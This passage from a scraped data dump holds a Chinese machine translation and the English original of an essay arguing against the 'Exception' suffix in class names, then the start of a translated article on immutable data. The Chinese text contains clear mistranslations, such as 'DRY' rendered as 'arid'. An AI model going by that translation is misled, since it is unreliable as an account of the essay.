\u6211\u4eec\u5341\u5e74\u91c7\u7528\u516c\u7ea6\u6765\u5236\u5b9a\u547d\u540d\u7684\u67d0\u4e9b\u65b9\u9762\u66f4\u5bb9\u6613\u3002\u8fd9\u6837\u7684\u4e00\u81f4\u6027\u53ef\u80fd\u662f\u4e00\u4ef6\u597d\u4e8b\uff0c\u4f46\u5e76\u975e\u6240\u6709\u4e00\u81f4\u7684\u5b9e\u8df5\u90fd\u5fc5\u7136\u597d\u3002\u5177\u6709\u5e38\u89c1\u7684\u6982\u5ff5\u8bcd\u6c47\u662f\u6709\u7528\u7684\uff0c\u4f46\u547d\u540d\u7684\u6982\u5ff5\u5e94\u8be5\u6709\u8d44\u683c\u4f5c\u4e3a\u6709\u7528\u7684\u4fe1\u606f - \u4e00\u81f4\u7684\u566a\u58f0\u53ea\u662f\u566a\u58f0\u3002\n \u987a\u52bf\u7597\u6cd5\u547d\u540d\u662f\u4e00\u4e2a\u6700\u5e38\u89c1\u7684\u4e60\u60ef\u7a0b\u5e8f\uff0c\u7a0b\u5e8f\u5458\u53ef\u4ee5\u5d29\u6e83\u800c\u6ca1\u6709\u610f\u8bc6\u5230\uff1a\u901a\u8fc7\u6dfb\u52a0\u66f4\u591a\u5355\u8bcd\u6765\u5236\u4f5c\u540d\u79f0\uff0c\u5176\u4e2d\u5305\u62ec\u6dfb\u52a0\u66f4\u591a\u542b\u4e49\u7684\u4ee3\u7801\uff0c\u4f46\u5728\u7ec3\u4e60\u4e0e\u6bcf\u4e2a\u5de5\u5382/\u7ba1\u7406\u5668/\u5bf9\u8c61/\u63a7\u5236\u5668/\u503c\u7a00\u91ca\u542b\u4e49\u65f6\u670d\u52a1/ ...\u6dfb\u52a0\u3002\u7a00\u91ca\u7684\u4e1c\u897f\u7a00\u91ca\u5b83\u4eec;\u5b83\u4e0d\u4f1a\u8ba9\u4ed6\u4eec\u66f4\u6709\u6548\u3002\u5c06lego-brick\u96f6\u4ef6\u7c98\u8d34\u5230\u6807\u8bc6\u7b26\u4e0d\u4f1a\u653e\u5927\u6216\u589e\u5f3a\u5176\u542b\u4e49\uff0c\u5e76\u4e14\u901a\u5e38\u7a81\u51fa\u663e\u793a\u5728\u7b2c\u4e00\u4f4d\u7f6e\u53ef\u80fd\u51e0\u4e4e\u6ca1\u6709\u610f\u4e49\u3002\u4e0d\u5e94\u4f7f\u7528\u547d\u540d\u7ea6\u5b9a\u6765\u652f\u6491\u5f31\u5c0f\u7684\u540d\u5b57\u3002\u5982\u679c\u4e00\u4e2a\u540d\u5b57\u6ca1\u6709\u5f88\u597d\u5730\u6c9f\u901a\uff0c\u6211\u4eec\u9700\u8981\u6e05\u695a\u5730\u770b\u5f85\u5b83\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u89e3\u51b3\u5b83\u800c\u4e0d\u662f\u7a92\u606f\u5b83\uff0c\u9690\u85cf\u5728\u4e50\u9ad8\u7684\u5899\u4e0a\u3002\n \u4e24\u4e2a\u987a\u52bf\u7597\u6cd5\u547d\u540d\u4eea\u5f0f\u4eea\u5f0f.NET\u548cJava Worlds\u90fd\u662f\u5c06\u540e\u7f00\u5f02\u5e38\u6dfb\u52a0\u5230\u7c7b\u4e2d\u4ee5\u8868\u793a\u5176\u5b9e\u4f8b\u662f\u5f02\u5e38\u7684\u3002\u8fd9\u79cd\u5174\u8da3\u5370\u8bb0\u4e8e\u5f00\u53d1\u5546\u4e0d\u77e5\u9053\u4ed6\u4eec\u5df2\u7ecf\u83b7\u5f97\u4e86\u4e60\u60ef - \u4ece\u4ed6\u4eec\u7684\u73af\u5883\u4e2d\u5438\u6536\u4e86\u672a\u7ecf\u5ba1\u67e5\u548c\u4e0d\u53d8\u7684\u5de5\u5382\u8bbe\u7f6e\u3002\n \u8fd9\u4e9b\u8bed\u8a00\u7684\u4f8b\u5916\u662f\u7279\u6743\u548c\u7a81\u51fa\u7684\uff0c\u8fd9\u610f\u5473\u7740\u57fa\u4e8e\u5b83\u4eec\u7684\u4e0a\u4e0b\u6587\uff0c\u7c7b\u548c\u5bf9\u8c61\uff0c\u8fd9\u4e9b\u7c7b\u548c\u5bf9\u8c61\u662f\u660e\u663e\u7684\uff0c\u5e76\u4e14\u4e0e\u4e0d\u662f\u7684\u7c7b\u548c\u5bf9\u8c61\u4e0d\u540c\u3002\u5b83\u4eec\u5177\u6709\u4e13\u7528\u7684\u6743\u5229\uff0c\u53ef\u4ee5\u5728\u4ee3\u7801\u4e2d\u7684\u7279\u5b9a\u548c\u7f16\u8bd1\u5668\u5f3a\u5236\u4e0a\u51fa\u73b0\uff1a\u5728\u63b7\u6f0f\uff0c\u5728Java\u7684\u6355\u83b7\u60c5\u51b5\u4e0b\uff0c\u5728\u629b\u51fa\u5217\u8868\u4e2d\uff08\u4f46\u770b\u51fa\u60a8\u662f\u5426\u53ef\u4ee5\u907f\u514d\u6b64\u95ee\u9898\uff09\u3002\u6839\u636e\u5b9a\u4e49\uff0c\u8fd9\u4e9b\u5730\u65b9\u51fa\u73b0\u7684\u4e8b\u60c5\u53ea\u80fd\u662f\u4f8b\u5916 - \u7f16\u8bd1\u5668\u77e5\u9053\u4ed6\u4eec\u5fc5\u987b\u662f\u4f8b\u5916\uff0c\u8bfb\u8005\u4e5f\u662f\u5982\u6b64\uff0c\u6240\u4ee5\u6ca1\u6709\u4ec0\u4e48\u53ef\u4ee5\u6dfb\u52a0\u3002\n  \u5728\u672c\u4e66\u7684\u7b2c\u4e00\u7248\u4e2d\uff0c\u6211\u4eec\u505a\u4e86\u4e00\u4e2a\u7cdf\u7cd5\u7684\u5de5\u4f5c\uff0c\u89e3\u91ca\u6211\u4eec\u7684\u610f\u601d\u4e0d\u8981\u91cd\u590d\u81ea\u5df1\u3002\u8bb8\u591a\u4eba\u8ba4\u4e3a\u5b83\u4ec5\u53c2\u8003\u4ee3\u7801\uff1a\u4ed6\u4eec\u8ba4\u4e3a\u5e72\u71e5\u7684\u624b\u6bb5\u201c\u4e0d\u8981\u590d\u5236\u6765\u6e90\u7684\u6e90\u7801\u3002\u201d\u3002\n \u8fd9\u662f\u5e72\u71e5\u7684\u4e00\u90e8\u5206\uff0c\u4f46\u5b83\u662f\u4e00\u4e2a\u5c0f\u90e8\u5206\u548c\u76f8\u5f53\u7410\u788e\u7684\u90e8\u5206\u3002 \n\u5e72\u71e5\u9002\u7528\u4e8e\u540d\u79f0\uff0c\u8bed\u8a00\u6784\u9020\u548c\u5143\u6570\u636e\uff0c\u5c31\u50cf\u5b83\u9002\u7528\u4e8e\u4ee3\u7801\u91cd\u590d\uff0c\u6587\u6863\u548c\u624b\u52a8\u91cd\u590d\u81ea\u52a8\u8fdb\u7a0b\u4e00\u6837\u591a\u3002\n \u5982\u679c\u60a8\u7684\u7f16\u7a0b\u8bed\u8a00\u8868\u793a\u5177\u6709\u6458\u8981\u7b49\u5173\u952e\u5b57\u7684\u62bd\u8c61\u7c7b\uff0c\u8bf7\u4e0d\u8981\u5728\u540d\u79f0\u4e2d\u653e\u7f6e\u6458\u8981\u6216\u901a\u8fc7\u544a\u8bc9\u8bfb\u8005\u901a\u8fc7\u547d\u540dIT\u57fa\u7840\u4f5c\u4e3a\u57fa\u7c7b\u6765\u91cd\u590d\u81ea\u5df1\u3002\u5982\u679c\u4e00\u4e2a\u7c7b\u662f\u4e00\u4e2a\u5177\u4f53\u7684\u7c7b\uff0c\u90a3\u4e48\u6839\u636e\u5b9a\u4e49\uff0c\u5b83\u662f\u4e00\u4e2a\u5b9e\u73b0\u7c7b\uff0c\u6240\u4ee5\u4e0d\u8981\u901a\u8fc7\u5c06icligh\u4e2d\u7684\u540d\u79f0\u7f6e\u4e8e\u81ea\u5df1\u6765\u91cd\u590d\u81ea\u5df1\u3002\u5982\u679c\u60a8\u7684\u7f16\u8bd1\u5668\u548cIDE\u53ef\u4ee5\u4ece\u5b57\u7b26\u4e32\u4e2d\u8bb2\u8ff0\u6574\u6570\uff0c\u8bf7\u4e0d\u8981\u901a\u8fc7\u5728\u53d8\u91cf\u540d\u79f0\u4e2d\u7f16\u7801\u8be5\u7ec6\u8282\u6765\u91cd\u590d\u81ea\u5df1\uff0c\u5982\u66fe\u7ecf\u53d7\u6b22\u8fce\u7684\u5308\u7259\u5229\u52a0\u5bc6\u65b9\u6848\u6240\u63a8\u5e7f\u7684\u3002\u5982\u679c\u60a8\u7684\u6d4b\u8bd5\u6846\u67b6\u60a8\u5c06\u4f7f\u7528\u6d4b\u8bd5\u6ce8\u91ca\uff0c\u5c5e\u6027\u6216\u5b8f\u6807\u8bb0\u60a8\u7684\u6d4b\u8bd5 - \u5e76\u4e14\u60a8\u7684\u6d4b\u8bd5\u51fa\u73b0\u5728\u7c7b\u4e2d\uff0c\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u4e2d\u540d\u4e3atest  - \u4e0d\u8981\u901a\u8fc7\u5728\u6d4b\u8bd5\u540d\u79f0\u4e2d\u5305\u542b\u6d4b\u8bd5\u6765\u91cd\u590d\u81ea\u5df1\u3002\u4f7f\u7528\u540d\u79f0\u7684\u5e26\u5bbd\u6765\u544a\u8bc9\u4ed6\u4eec\u9700\u8981\u77e5\u9053\u7684\u8bfb\u8005\u4e8b\u7269\u800c\u4e0d\u662f\u91cd\u590d\u5df2\u77e5\u7684\u5185\u5bb9\u3002\u4f7f\u7528\u5e26\u5bbd\u8fdb\u884c\u4fe1\u53f7\u800c\u4e0d\u662f\u566a\u58f0 - \u5e76\u4f7f\u7528\u66f4\u5c11\u7684\u5e26\u5bbd\u3002\n \u6211\u4eec\u660e\u767d\uff0c\u4e00\u4e2a\u7c7b\u53ca\u5176\u5b9e\u4f8b\u4ee3\u8868\u4e86\u4ed6\u4eec\u7684\u8bed\u6cd5\u4f4d\u7f6e\u7684\u4f8b\u5916\uff0c\u4f46\u8fd9\u4e0d\u662f\u552f\u4e00\u7684\u7ebf\u7d22\u3002\u9636\u7ea7\u4ee3\u8868\u5f02\u5e38\uff0c\u4e5f\u5e94\u8be5\u901a\u8fc7\u5176\u7236\u6bcd\u6216\u5176\u540d\u79f0\u6765\u663e\u800c\u6613\u89c1\u3002\u8fd9\u4e2a\u540d\u5b57\u5e94\u8be5\u4ee3\u8868\u4efb\u4f55\u95ee\u9898\uff0c\u5e76\u4e14\u5e94\u8be5\u76f4\u63a5\uff0c\u5177\u4f53\u5730\u8fd9\u6837\u505a\u3002\u8981\u5c06\u5f02\u5e38\u6dfb\u52a0\u5230\u672b\u5c3e\u662f\u5197\u4f59\u7684 - \u6240\u4ee5\u5220\u9664\u5b83 - \u6216\u6307\u793a\u8f83\u5dee\u7684\u540d\u79f0 - \u56e0\u6b64\u91cd\u547d\u540d\u5b83\u3002\n     \u8fd9\u4e9b\u540d\u79f0\u7b80\u660e\u627c\u8981\u3002\u5373\u4f7f\u6ca1\u6709\u770b\u5230\u4ed6\u4eec\u7684\u4f7f\u7528\u80cc\u666f\uff0c\u90a3\u4e48\u51e0\u4e4e\u6ca1\u6709\u8d28\u7591\u8fd9\u4e9b\u662f\u574f\u6d88\u606f\u7684\u627f\u8f7d\u3002 .NET\u5f02\u5e38\u4f7f\u7528\u7c7b\u4f3c\u8d1f\u9634\u6027\u7684\u63aa\u8f9e\uff0c\u4ee5\u53ca\u4e0e\u65e0\u6548\u548c\u574f\u7684\u5176\u4ed6\u4e0d\u7965\u8bcd\u3002\u6709\u5f88\u5c11\u7684\u8bef\u89e3\u4f59\u5730\u3002\n     \u55ef\uff0c\u4e0d\u592a\u6e05\u695a\u3002\u4f46\u662f\u4e22\u5f03\u5f02\u5e38\u540e\u7f00\u7684\u95ee\u9898\u662f\u4ec0\u4e48\uff1f\u8fd8\u662f\u901a\u8fc7\u6389\u843d\u5b83\u63ed\u793a\u4e86\u4e00\u4e2a\u95ee\u9898\uff1f\u8ba9\u6211\u4eec\u5c1d\u8bd5\u5c06\u8fd9\u4e9b\u8bfe\u7a0b\u91cd\u547d\u540d\u4e3a\u4ed6\u4eec\u5b9e\u9645\u4fe1\u53f7\u7684\u95ee\u9898\uff1a\n  \u8fd9\u4e9b\u4fee\u8ba2\u7684\u540d\u79f0\u65e2\u51c6\u786e\u53c8\u7cbe\u786e\uff0c\u6307\u793a\u5f02\u5e38\u7684\u5b9e\u9645\u60c5\u51b5\u800c\u4e0d\u6a21\u7cca\u6216\u8bc9\u8bf8\u566a\u97f3\u3002\u5b89\u5168\u5730\u662f\u4e00\u4e2a\u4f8b\u5916\u5417\uff1f\u4e0d\uff0c\u4f46\u5b89\u5168\u8fdd\u89c4\u662f\u3002\u4f8b\u5916\u6d89\u53ca\u5b89\u5168\u6027\uff0c\u4f46\u540d\u79f0\u9519\u8fc7\u4e86\u5177\u4f53\u7684\u673a\u4f1a\u3002\u540c\u6837\uff0cNumberFormat\u4e0d\u662f\u95ee\u9898\uff0c\u800c\u662f\u5c1d\u8bd5\u4f7f\u7528\u5177\u6709InvalidNumberFormat\u7684\u5b57\u7b26\u4e32\u3002\n \u662f\u503c\u5f97\u7684\uff0c\u6307\u9488\uff08umm\uff0c\u5f15\u7528\uff09\u4e3anull\uff1f\u4e0d\uff0c\u5728\u5177\u6709\u53ef\u4ee5\u8bbe\u7f6e\u4e3anull\u7684\u5f15\u7528\u7684\u8bed\u8a00\u4e2d\uff0cnull\u662f\u53ef\u63a5\u53d7\u7684\u503c\u3002\u53d1\u4fe1\u53f7\u901a\u77e5\u7684\u95ee\u9898\u662fNULL\u5df2\u5728JVM\u4e2d\u53d6\u6d88\u5f15\u7528\uff0c\u4f8b\u5982\u901a\u8fc7NULL\u5f15\u7528\u8c03\u7528\u65b9\u6cd5\uff0c\u6216\u8005\u5df2\u5c06NULL\u4f20\u9012\u7ed9\u5c06NULL\u4f5c\u4e3a\u53c2\u6570\u6240\u65e0\u6548\u7684\u4ee3\u7801\u4f20\u9012\u7ed9\u4ee3\u7801\u3002\u65e0\u8bba\u54ea\u79cd\u65b9\u5f0f\uff0cnull\u90fd\u662f\u610f\u5916\u7684\u3002 \n\u66f4\u5177\u4f53\u5730\u5bf9\u540d\u79f0\u4e5f\u6709\u52a9\u4e8e\u7a81\u51fa\u663e\u793a\u6b67\u4e49\u548c\u6a21\u7cca\u6027\uff0c\u5c31\u50cf\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff1aJava\u7ec3\u4e60\u5c31\u65e0\u6cd5\u5728\u8bed\u8a00\u4fe1\u53f7\u9519\u8bef\u7684\u9519\u8bef\u4e4b\u95f4\u660e\u786e\u533a\u5206\uff0c\u4f8b\u5982\u53d6\u6d88\u5f15\u7528\u7a7a\u7f3a\u548c\u4ee3\u7801\u4fe1\u53f7\u9519\u8bef\uff0c\u4f8b\u5982\u62d2\u7eddNull Argument\u4f5c\u4e3a\u975e\u6cd5\u7684\u3002\u5728.NET\u4e2d\uff0c\u4ee5\u524d\u7684\u6848\u4f8b\u4f7f\u7528nullReferenceException\uff08\u5373\uff0cnulldeReference\uff09\u548c\u540e\u8005\u4f7f\u7528ArgumentNulLException\uff08\u5373\uff0cInvalidNullargument\uff09\uff0c\u8fd9\u662fArgumentException\uff08\u5373\uff0cInvalidArgument\uff09\u3002\u5173\u4e8eJava\u4ee3\u7801\u662f\u5426\u88ab\u5199\u5165\u629b\u51fanullpointerexception\u6216IllegalArgumentException\u5728\u5f88\u5927\u7a0b\u5ea6\u4e0a\u4f9d\u8d56\u4e8e\u7801\u5b57\uff0c\u56e2\u961f\uff0c\u4e2a\u4eba\uff0c\u6708\u7403\u9636\u6bb5\u7b49\u3002\n \u6b63\u5982\u60a8\u5728\u5199\u5165\u6216\u8bf4\u8bdd\u7684\u65f6\u5019\u6ca1\u6709\u7528\u52a8\u8bcd\u6216\u540d\u8bcd\u6807\u8bb0\u52a8\u8bcd\u6216\u540d\u8bcd\u7684\u52a8\u8bcd\u4e00\u6837\uff0c\u5f88\u5c11\u6709\u539f\u56e0 - \u4ee5\u53ca\u8bb8\u591a\u539f\u56e0\u4e0d - \u5728\u5f02\u5e38\u7c7b\u540d\u79f0\u7ed3\u675f\u65f6\u89e3\u51b3\u5f02\u5e38\u3002\u5b83\u53ef\u4ee5\u88ab\u89c6\u4e3a\u4e00\u79cd\u4ee3\u7801\u95fb\u540d\u800c\u4e0d\u662f\u9075\u5faa\u7684\u505a\u6cd5\uff0c\u901a\u5e38\u5265\u593a\u7a0b\u5e8f\u5458\u6709\u673a\u4f1a\u627e\u5230\u66f4\u597d\u7684\u540d\u5b57\u3002\n \u8fd9\u65b9\u9762\u53ef\u80fd\u7684\u4f8b\u5916\u60c5\u51b5\uff1f\u6307\u793a\u5176\u540e\u4ee3\u7684\u4e00\u822c\u7c7b\u662f\u4f8b\u5916\uff1a\u4f8b\u5916\u3002\u4f46\u662f\uff0c\u7136\u540e\uff0c\u8fd9\u4e0d\u662f\u4e00\u4e2a\u540e\u7f00\uff1a\u8fd9\u662f\u5b83\u7684\u6574\u4e2a\u540d\u5b57\u548c\u5b83\u4ee3\u8868\u7684\u6982\u5ff5\uff0c\u6240\u4ee5\u9664\u4e86\u5f02\u5e38\u547d\u540d\u65f6\u51e0\u4e4e\u6ca1\u6709\u4f8b\u5916\u3002 ", "note_en": "One of the hardest things in software development is naming. Naming of products, of paradigms and of parts of your code. The reason naming is both hard and important is because it is an act of communication; without good names your code might as well be written in, well, code. A name is not simply a label: it informs and guides the reader\u2019s mental model. Names can change the way the reader thinks. A good name is a sharing of minds; a poor name is a missed opportunity to learn and say what we mean.\n We of  ten adopt conventions to make some aspects of naming easier. Such consistency can be a good thing, but not all practices that are consistent are necessarily good. Having a common vocabulary of concepts is useful across a codebase, but the concepts named should qualify as useful information \u2014 consistent noise is just noise.\n Homeopathic naming is one of the commonest habits programmers can fall into without realising: making names longer by adding more words with the goal of adding more meaning to code, but in practice diluting the meaning with every   Factory/ Manager/ Object/ Controller/ Value/Service/\u2026 added. Diluting things dilutes them; it does not make them more potent. Affixing Lego-brick parts to an identifier does not amplify or enhance its meaning, and often serves to highlight there may have been little meaning there in the first place. A naming convention should not be used to prop up weak names. If a name doesn\u2019t communicate well, we need to see that clearly so we can address it rather than smothering it, hiding it behind a wall of Lego.\n One homeopathic naming ritual common to both the .NET and the Java worlds is adding the suffix  Exception to a class to denote that its instances are exceptions. This affectation is imprinted on developers unaware that they have acquired it as a habit \u2014 an unexamined and unchanged  factory setting absorbed from their environment.\n Exceptions in these languages are privileged and prominent, meaning that, based on their context, classes and objects that are exceptions are visibly and syntactically distinct from classes and objects that are not. They have exclusive rights to appear in specific and compiler-enforced places in your code: in a  throw, in a  catch and, in the case of the Java, in a  throws list (but  see if you can avoid this). By definition, things that appear in these places can only be exceptions \u2014 the compiler knows they must be exceptions and so does the reader, so there\u2019s nothing more to add.\n  In the first edition of this book we did a poor job of explaining what we meant by  Don\u2019t Repeat Yourself. Many people took it to refer to code only: they thought that DRY means \u201cdon\u2019t copy-and-paste lines of source.\u201d\n That  is part of DRY, but it\u2019s a tiny fraction and a fairly trivial part.\n DRY applies to names, language constructs and metadata just as much as it applies to code duplication, documentation and manual repetition of automatable processes.\n If your programming language denotes abstract classes with a keyword such as  abstract, don\u2019t repeat yourself by putting  Abstract in the name or by telling the reader that its necessary use is as base class by naming it  Base. If a class is a concrete class then, by definition, it is an implementation class, so don\u2019t repeat yourself by putting  Impl in the name. If your compiler and IDE can tell an integer from a string, don\u2019t repeat yourself by encoding that detail in a variable name, as popularised by the once-popular Hungarian encryption scheme. If your testing framework has you mark your tests with a  Test annotation, attribute or macro \u2014 and your test appears inside a class, file or folder named  Test \u2014 don\u2019t repeat yourself by including  Test in the name of your test. Use the bandwidth of a name to tell the reader things they need to know rather than repeating what is already known. Use your bandwidth for signal rather than noise \u2014 and use less bandwidth.\n We understand that a class and its instances represent exceptions by their syntactic position, but this is not the only clue. That a class represents an exception should also be obvious either by its parentage or by its name. The name should represent whatever the problem is, and should do so directly and specifically. To add  Exception to the end is either redundant \u2014 so remove it \u2014 or an indication of a poor name \u2014 so rename it.\n     These names are concise and descriptive. Even without seeing their context of use, there is little question that these are bearers of bad news. .NET exceptions use similarly negative phrasing, and other ominous words like  Invalid and  Bad. There is little room for misunderstanding.\n     Hmm, not so clear. But is that a problem with dropping the  Exception suffix? Or is it a problem revealed by dropping it? Let\u2019s try renaming these classes to the problems they actually signal:\n  These revised names are both accurate and precise, indicating the actual condition of the exception without being vague or resorting to noise words. Is security grounds for an exception? No, but a security violation is. The exception relates to security, but the name misses the opportunity to be specific. Similarly,  NumberFormat is not the problem, but attempting to use a string with an  InvalidNumberFormat is.\n Is it exception-worthy that a pointer (umm, reference) is null? No, in a language with references that can be set to null, null is an acceptable value. The problem being signalled is either that a null has been dereferenced in the JVM, such as calling a method via a null reference, or that a null has been passed to code that considers null to be invalid as an argument. Either way, the null is unexpected.\n Being more specific about names also helps highlight ambiguities and vagueness, as in this case: Java practice fails to make a clear distinction between language-signalled errors, such as dereferencing nulls, and code-signalled errors, such as rejecting a null argument as illegal. In .NET, the former case is expressed using  NullReferenceException (i.e.,  NullDereferenced) and the latter using  ArgumentNullException (i.e.,  InvalidNullArgument), which is an  ArgumentException (i.e.,  InvalidArgument). As to whether Java code is written to throw  NullPointerException or  IllegalArgumentException is largely dependent on the codebase, the team, the individual, the phase of the moon, etc.\n Just as you don\u2019t tag your verbs with  Verb or your nouns with  Noun when you write or speak, there is little reason \u2014 and many reasons not to \u2014 tack  Exception onto the end of an exception class\u2019s name. It can be considered a code smell rather than a practice to follow, often depriving programmers of the opportunity to find a better name.\n A possible exception to this guideline? The general class that indicates that its descendants are exceptions:  Exception. But then again, that\u2019s not a suffix: that\u2019s the whole of its name and the concept that it represents, so perhaps there are few exceptions on  Exception naming.", "posttime": "2021-06-26 17:33:35", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u5353\u8d8a,exceptional,\u540d\u79f0", "title": "\u5353\u8d8a\u7684\u547d\u540d ", "title_en": "Exceptional Naming", "transed": 1, "url": "https://kevlinhenney.medium.com/exceptional-naming-6e3c8f5bffac", "via": "", "real_tags": ["\u5353\u8d8a", "\u540d\u79f0"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1068410, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "2016\u5e741\u670820\u65e5\u7b2c13\u5377\uff0c\u7b2c9\u671f\u6709\u4e00\u4e2a\u4e0d\u53ef\u907f\u514d\u7684\u8d8b\u52bf\uff0c\u53ef\u4ee5\u5b58\u50a8\u548c\u53d1\u9001\u4e0d\u53ef\u6539\u53d8\u7684\u6570\u636e\u3002\u6211\u4eec\u9700\u8981\u5728\u8fdc\u5904\u534f\u8c03\u4e0d\u53ef\u53d8\uff0c\u6211\u4eec\u53ef\u4ee5\u8d1f\u62c5\u4e0d\u53d8\uff0c\u56e0\u4e3a\u50a8\u5b58\u53d8\u5f97\u66f4\u4fbf\u5b9c\u3002\u672c\u6587\u662f\u4e00\u79cdamuse-bouche\u91c7\u6837\uff0c\u91cd\u590d\u7684\u8ba1\u7b97\u6a21\u5f0f\u53ef\u4ee5\u5229\u7528\u4e0d\u53ef\u53d8\u8282\u6027\u3002\u4e0a\u4e0b\u722c\u4e0a\u8ba1\u7b97\u5806\u6808\u771f\u7684\u786e\u5b9e\u53ef\u4ee5\u518d\u6b21\u4ea7\u751f\u4e86\u4e00\u5b9a\u7a0b\u5ea6\u7684D\u00e9j\u00e0vu\u3002\n \u5b83\u5f88\u4e45\u4ee5\u524d\u90a3\u5f88\u4e45\u4ee5\u524d\u90a3\u5f88\u6602\u8d35\uff0c\u78c1\u76d8\u5b58\u50a8\u4ef7\u683c\u6602\u8d35\uff0cDRAM\uff08\u52a8\u6001\u968f\u673a\u5b58\u53d6\u5b58\u50a8\u5668\uff09\u6602\u8d35\uff0c\u4f46\u4e0e\u95e9\u9501\u7684\u534f\u8c03\u5f88\u4fbf\u5b9c\u3002\u73b0\u5728\u6240\u6709\u8fd9\u4e9b\u90fd\u4f7f\u7528\u5ec9\u4ef7\u8ba1\u7b97\uff08\u6709\u8bb8\u591a\u6838\u5fc3\uff09\uff0c\u5ec9\u4ef7\u7684\u5546\u54c1\u78c1\u76d8\u548c\u5ec9\u4ef7\u7684DRAM\u548cSSD\uff08\u56fa\u6001\u9a71\u52a8\u5668\uff09\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u800c\u4e0e\u9501\u5b58\u5668\u7684\u534f\u8c03\u53d8\u5f97\u66f4\u52a0\u56f0\u96be\uff0c\u56e0\u4e3a\u9501\u5b58\u5ef6\u8fdf\u5931\u53bb\u4e86\u5927\u91cf\u7684\u6307\u5bfc\u673a\u4f1a\u3002\u4fdd\u6301\u4e0d\u53d8\u7684\u526f\u672c\uff0c\u73b0\u5728\u4ef7\u683c\u5b9e\u60e0\uff0c\u4e00\u4e2a\u652f\u4ed8\u51cf\u5c11\u4e86\u534f\u8c03\u6311\u6218\u3002\n   \u7531\u4e8e\u78c1\u76d8\u7684\u6bcf\u78c5\u6210\u672c\uff0c\u5b58\u50a8\u8d8a\u6765\u8d8a\u591a\u5730\u589e\u52a0\u3002\u8fd9\u610f\u5473\u7740\u5f88\u591a\u6570\u636e\u53ef\u4ee5\u4fdd\u6301\u5f88\u957f\u65f6\u95f4\u3002\u968f\u7740\u8d8a\u6765\u8d8a\u591a\u7684\u6570\u636e\u548c\u5de5\u4f5c\u8d8a\u6765\u8d8a\u591a\uff0c\u5206\u5e03\u6b63\u5728\u589e\u52a0\u3002\u6570\u636e\u4e2d\u5fc3\u5185\u7684\u6570\u636e\u4f3c\u4e4e\uff06\uff0334;\u9065\u8fdc\u3002\uff06\uff0334;\u8bb8\u591a\u6838\u5fc3\u82af\u7247\u5185\u7684\u6570\u636e\u53ef\u80fd\u770b\u8d77\u6765\uff06\uff0334;\u9065\u8fdc\u3002\uff06\uff0334;\u5728\u5c1d\u8bd5\u4e0e\u8fdc\u79bb\u8fdc\u65b9\u7684\u7cfb\u7edf\u534f\u8c03\u65f6\uff0c\u6b67\u4e49\u6b63\u5728\u589e\u52a0 - \u81ea\u4ece\u60a8\u542c\u5230\u65b0\u95fb\u4ee5\u6765\u53d1\u751f\u4e86\u66f4\u591a\u7684\u4e1c\u897f\u3002\u4f60\u80fd\u91c7\u53d6\u4e0d\u5b8c\u6574\u7684\u77e5\u8bc6\u5417\uff1f\u4f60\u80fd\u7b49\u5230\u8db3\u591f\u7684\u77e5\u8bc6\u5417\uff1f\n   \u968f\u7740\u5404\u79cd\u6280\u672f\u9886\u57df\u7684\u53d1\u5c55\uff0c\u4ed6\u4eec\u901a\u8fc7\u4ee5\u4e00\u4e9b\u975e\u5e38\u6709\u8da3\u7684\u65b9\u5f0f\u4f7f\u7528\u4e0d\u53ef\u53d8\u6570\u636e\uff0c\u56de\u5e94\u4e86\u589e\u52a0\u5b58\u50a8\uff0c\u5206\u914d\u548c\u6b67\u4e49\u7684\u8fd9\u4e9b\u8d8b\u52bf\u3002\u672c\u6587\u63a2\u8ba8\u4e86\u5e94\u7528\u7a0b\u5e8f\u5728\u6301\u7eed\u7684\u5de5\u4f5c\u4e2d\u4f7f\u7528\u4e0d\u53d8\u6027\uff0c\u5982\u4f55\u4e3a\u7a0d\u540e\u7684\u79bb\u7ebf\u5206\u6790\u751f\u6210\u4e0d\u53ef\u53d8\u6570\u636e\u96c6\uff0cSQL\u5982\u4f55\u66b4\u9732\u548c\u5904\u7406\u4e0d\u53ef\u6539\u53d8\u7684\u5feb\u7167\uff0c\u4ee5\u53ca\u5927\u89c4\u6a21\u5e76\u884c\u7684\u5927\u6570\u636e\u5de5\u4f5c\u5982\u4f55\u4f9d\u8d56\u4e8e\u4e0d\u53ef\u53d8\u6570\u636e\u96c6\u3002\u8fd9\u5bfc\u81f4\u5728\u5269\u4f59\u4e0d\u53d8\u7684\u540c\u65f6\u53ef\u4ee5\u6539\u53d8\u8bed\u4e49\u4e0d\u53ef\u53d8\u6570\u636e\u96c6\u7684\u65b9\u5f0f\u3002\n \u63a5\u4e0b\u6765\uff0c\u8be5\u6587\u7ae0\u8003\u8651\u4e86\u5982\u4f55\u901a\u8fc7LSF\uff08\u65e5\u5fd7\u7ed3\u6784\u5316\u6587\u4ef6\u7cfb\u7edf\uff09\uff0cCOW\uff08\u7f16\u5199\u5199\u5165\uff09\u548cLSM\uff08Log-Structureed Merge-Tree\uff09\u7b49\u6280\u672f\u5728\u521b\u5efa\u65b0\u7684Upcutable\u6587\u4ef6\u4e2d\u5982\u4f55\u5206\u5c42\u66f4\u65b0\u6027\u3002\u590d\u5236\u548c\u5206\u5e03\u5f0f\u6587\u4ef6\u7cfb\u7edf\u5982\u4f55\u4f9d\u8d56\u4e8e\u6d88\u9664\u5f02\u5e38\u7684\u4e0d\u53d8\u6027\uff1f\u786c\u4ef6\u4eba\u58eb\u901a\u8fc7\u5229\u7528SSD\u548cHDD\uff08\u786c\u76d8\u9a71\u52a8\u5668\uff09\u5229\u7528\u8fd9\u4e9b\u6280\u5de7\u52a0\u5165\u4e86\u6d3e\u5bf9\u3002\u4e0d\u53d8\u6027\u662f\u5806\u53e0\u591a\u5c42\u7684\u5173\u952e\u5efa\u7b51\u6982\u5ff5\uff0c\u5982\u56fe1\u6240\u793a\u3002\n     \u53ea\u6709\u8bb8\u591a\u7c7b\u578b\u7684\u8ba1\u7b97\u90fd\u662f\u9644\u5f55\u7684\u3002\u672c\u8282\u770b\u4e00\u4e9b\u5e38\u7528\u7684\u65b9\u5f0f\u3002\n   